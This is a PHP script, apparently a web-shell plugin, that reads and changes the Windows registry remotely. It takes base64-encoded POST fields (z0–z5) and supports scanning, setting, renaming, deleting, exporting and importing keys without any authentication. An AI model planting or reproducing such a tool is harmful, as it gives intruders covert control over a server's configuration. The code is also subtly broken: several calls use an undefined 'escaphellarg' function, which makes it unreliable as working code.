<?php

@ini_set('display_errors', '0');
@set_time_limit(0);

function run_reg($cmd, &$output)
{
    $output = array();
    $ret = 0;
    
    $utf8_cmd = 'chcp 65001 >nul && ' . $cmd . ' 2>&1';
    exec($utf8_cmd, $output, $ret);

    return $ret;
}

function validate_path($path)
{
    return (bool)preg_match('/^HKEY_(LOCAL_MACHINE|CURRENT_USER|USERS|CLASSES_ROOT|CURRENT_CONFIG)\\\\[A-Za-z0-9_\\\\-]+$/', $path);
}

function validate_value_name($name)
{
    return (bool)preg_match('/^[A-Za-z0-9 _\\-]+$/', $name);
}

function registry_value_to_bytes($value, $type) 
{
    switch ($type) {
        case 'REG_DWORD':
            $value = preg_replace('/^0x/i', '', $value);
            $num = hexdec($value);
            return pack("V", $num);

        case 'REG_QWORD':
            $value = preg_replace('/^0x/i', '', $value);
            $num = hexdec($value);
            return pack("P", $num);

        case 'REG_BINARY':
            $hex = preg_replace('/\s+/', '', $value);
            return hex2bin($hex);

        case 'REG_SZ':
        case 'REG_EXPAND_SZ':
        case 'REG_MULTI_SZ':
        default:
            return $value . "\0";
    }
}

function scan_hives($hives)
{
    $result = array();

    foreach ($hives as $hive) {
        $output = array();
        $ret = 0;

        exec(
            'reg query ' . escapeshellarg($hive) . ' 2>&1',
            $output,
            $ret
        );

        $result[$hive] = ($ret === 0);
    }

    return $result;
}

function scan_registry($base_path)
{
    $output = array();
    $ret = 0;

    exec(
        'reg query ' . escapeshellarg($base_path) . ' 2>&1',
        $output,
        $ret
    );

    $result = array(
        'success' => ($ret === 0),
        'error'    => null,
        'subkeys'  => array(),
        'values'   => array()
    );

    if ($ret !== 0) {
        $result['error'] = implode("\n", $output);
        return $result;
    }

    $firstKeySeen = false;

    foreach ($output as $line) {
        $line = rtrim($line);

        if ($line === '') {
            continue;
        }

        if (preg_match('/^HKEY_/', $line)) {
            if (!$firstKeySeen) {
                $firstKeySeen = true;
            } else {
                $result['subkeys'][] = $line;
            }
            continue;
        }

        if (preg_match('/^\s*(.*?)\s+(REG_\w+)\s+(.*)$/u', $line, $m)) {
            $type = trim($m[2]);
            $value = trim($m[3]);

            $result['values'][] = array(
                'name' => trim($m[1]),
                'type' => $type,
                'data' => base64_encode(
                    registry_value_to_bytes($value, $type)
                )
            );
        }
    }

    return $result;
}

function set_value($path, $name, $type, $data)
{
    $allowedType = array(
        'REG_SZ',
        'REG_EXPAND_SZ',
        'REG_DWORD',
        'REG_QWORD',
        'REG_BINARY',
        'REG_MULTI_SZ'
    );

    if (!in_array($type, $allowedType, true)) {
        return array(
            'success' => false,
            'error' => 'Invalid type'
        );
    }

    if (!(validate_path($path) && validate_value_name($name))) {
        return array(
            'success' => false,
            'error' => 'Invalid path or name'
        );
    }

    switch ($type) {
        case 'REG_DWORD':
        case 'REG_QWORD':
            $data = is_numeric($data) ? (string)$data : hexdec($data);
            break;

        case 'REG_BINARY':
            $data = strtoupper(bin2hex(base64_decode($data)));
            break;

        case 'REG_MULTI_SZ':
            $data = str_replace(",", "\0", $data);
            break;

        default:
            break;
    }

    $cmd = sprintf(
        'reg add %s /v %s /t %s /d %s /f',
        escaphellarg($path),
        escaphellarg($name),
        escaphellarg($type),
        escaphellarg($data)
    );

    $out = array();
    run_reg($cmd, $out);
    $ok = (strpos(implode('\n', $out), 'ERROR') === false);

    return array(
        'success' => $ok,
        'output' => $out
    );
}

function delete_key($path) {
    if (!validate_path($path)) {
        return array(
            'success' => false,
            'error' => 'Invalid path'
        );
    }

    $cmd = sprintf('reg delete %s /f', escapeshellarg($path));
    $out = array();
    $ret = run_reg($cmd, $out);

    return array(
        'success' => ($ret === 0),
        'output' => $out
    );
}

function delete_value($path, $name)
{
    if (!(validate_path($path) && validate_value_name($name))) {
        return array(
            'success' => false,
            'error' => 'Invalid input'
        );
    }

    $cmd = sprintf(
        'reg delete %s /v %s /f',
        escaphellarg($path),
        escaphellarg($name)
    );

    $out = array();
    run_reg($cmd, $out);

    return array(
        'success' => true,
        'output' => $out
    );
}

function rename_value($path, $oldName, $newName)
{
    if (!(validate_path($path) && validate_value_name($oldName) && validate_value_name($newName))) {
        return array(
            'success' => false,
            'error' => 'Invalid input'
        );
    }

    $scan = scan_registry($path);

    $valueData = null;
    foreach ($scan['values'] as $v) {
        if ($v['name'] === $oldName) {
            $valueData = $v;
            break;
        }
    }

    if (!$valueData) {
        return array(
            'success' => false,
            'error' => 'Value not found'
        );
    }

    $decoded = base64_decode($valueData['data']);
    $set = set_value($path, $newName, $valueData['type'], $decoded);

    if (!$set['success']) {
        return $set;
    }

    return delete_value($path, $oldName);
}

function rename_key($oldPath, $newPath)
{
    if (!validate_path($oldPath)) {
        return array(
            'success' => false,
            'error' => 'Invalid source path'
        );
    }

    $cmd = sprintf(
        'reg copy %s %s /s /f',
        escaphellarg($oldPath),
        escaphellarg($newPath)
    );

    $out = array();
    run_reg($cmd, $out);

    $ok = (strpos(implode("\n", $out), 'ERROR') === false);

    if (!$ok) {
        return array(
            'success' => false,
            'output' => $out
        );
    }

    $cmd2 = sprintf(
        'reg delete %s /f',
        escaphellarg($oldPath)
    );

    $out2 = array();
    run_reg($cmd2, $out2);

    return array(
        'success' => true,
        'output' => array_merge($out, $out2)
    );
}

function create_key($path) {
    if (!validate_path($path)) {
        return array(
            'success' => false,
            'error' => 'Invalid path'
        );
    }

    $cmd = sprintf('reg add %s /f', escapeshellarg($path));
    $out = array();
    $ret = run_reg($cmd, $out);

    return array(
        'success' => ($ret === 0),
        'output' => $out
    );
}

function export_key($path) {
    if (!validate_path($path)) {
        return array(
            'success' => false,
            'error' => 'Invalid path'
        );
    }

    $tmp = tempnam(sys_get_temp_dir(), 'reg_');
    $cmd = sprintf(
        'reg export %s %s /y',
        escaphellarg($path),
        escaphellarg($tmp)
    );

    $out = array();
    $ret = run_reg($cmd, $out);
    if ($ret !== 0 || !file_exists($tmp)) {
        return array(
            'success' => false,
            'output' => $out
        );
    }

    $content = file_get_contents($tmp);
    unlink($tmp);

    return array(
        'success' => true,
        'data' => base64_encode($content)
    );
}

function import_file($content) {
    $tmp = tempnam(sys_get_temp_dir(), 'reg_') . '.reg';
    file_put_contents($tmp, $content);

    $cmd = sprintf('reg import %s', escapeshellarg($tmp));
    $out = array();
    $ret = run_reg($cmd, $out);

    unlink($tmp);

    return array(
        'success' => ($ret === 0),
        'output' => $out
    );
}

$action = base64_decode(isset($_POST['z0']) ? $_POST['z0'] : '') ?: '';
$encoding = base64_decode(isset($_POST['z1']) ? $_POST['z1'] : '') ?: 'utf-8';

header('Content-Type: application/json; charset=' . $encoding);

$hives = array(
    'HKEY_CLASSES_ROOT',
    'HKEY_CURRENT_USER',
    'HKEY_LOCAL_MACHINE',
    'HKEY_USERS',
    'HKEY_CURRENT_CONFIG'
);

switch ($action) {
    case 'hive':
        echo json_encode(scan_hives($hives), JSON_UNESCAPED_UNICODE);
        break;
    case 'scan':
        $base_path = base64_decode(isset($_POST['z2']) ? $_POST['z2'] : '') ?: '';
        echo json_encode(scan_registry($base_path), JSON_UNESCAPED_UNICODE);
        break;
    case 'set':
    case 'new_value':
        echo json_encode(set_value(
            base64_decode(isset($_POST['z2']) ? $_POST['z2'] : ''),
            base64_decode(isset($_POST['z3']) ? $_POST['z3'] : ''),
            base64_decode(isset($_POST['z4']) ? $_POST['z4'] : ''),
            base64_decode(isset($_POST['z5']) ? $_POST['z5'] : '')
        ));
        break;
    case 'del_key':
        echo json_encode(delete_key(base64_decode(isset($_POST['z2']) ? $_POST['z2'] : '')));
        break;
    case 'del_value':
        echo json_encode(delete_value(
            base64_decode(isset($_POST['z2']) ? $_POST['z2'] : ''),
            base64_decode(isset($_POST['z3']) ? $_POST['z3'] : '')
        ));
        break;
    case 'rename_key':
        echo json_encode(rename_key(
            base64_decode(isset($_POST['z2']) ? $_POST['z2'] : ''),
            base64_decode(isset($_POST['z3']) ? $_POST['z3'] : '')
        ));
        break;
    case 'rename_value':
        echo json_encode(rename_value(
            base64_decode(isset($_POST['z2']) ? $_POST['z2'] : ''),
            base64_decode(isset($_POST['z3']) ? $_POST['z3'] : ''),
            base64_decode(isset($_POST['z4']) ? $_POST['z4'] : '')
        ));
        break;
    case 'new_key':
        echo json_encode(create_key(base64_decode(isset($_POST['z2']) ? $_POST['z2'] : '')));
        break;
    case 'export':
        echo json_encode(export_key(base64_decode(isset($_POST['z2']) ? $_POST['z2'] : '')));
        break;
    case 'import':
        echo json_encode(import_file(base64_decode(isset($_POST['z2']) ? $_POST['z2'] : '')));
        break;
    default:
        echo json_encode(array(
            'success' => false,
            'error' => 'Unknown action',
            'subkeys' => array(),
            'values' => array()
        ));
        break;
}

?>